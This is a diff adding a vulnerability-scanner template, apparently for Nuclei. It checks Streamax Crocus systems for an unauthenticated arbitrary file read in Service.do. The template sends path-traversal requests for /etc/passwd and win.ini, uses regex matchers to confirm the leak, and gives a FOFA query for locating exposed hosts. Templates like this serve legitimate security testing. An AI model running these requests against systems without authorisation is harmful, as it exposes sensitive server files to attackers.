@@ -1,0 +1,29 @@
+id: streamax-Service-do-fileread
+info:
+  name: 锐明技术 Crocus 系统 Service.do - fileread
+  author: leadlife
+  severity: high
+  description: 锐明技术Crocus系统 Service.do接口存在任意文件读取漏洞，未经过身份验证的远程攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E9%94%90%E6%98%8E%E6%8A%80%E6%9C%AFCrocus%E7%B3%BB%E7%BB%9F/%E9%94%90%E6%98%8E%E6%8A%80%E6%9C%AFCrocus%E7%B3%BB%E7%BB%9FService.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="/ThirdResource/respond/respond.min.js" && title="Crocus"
+  tags: streamax,fileread,lfi
+
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Service.do?Action=Download&Path=C:/windows/win.ini"
+      - "{{BaseURL}}/Service.do?Action=Download&Path=/etc/passwd"
+
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
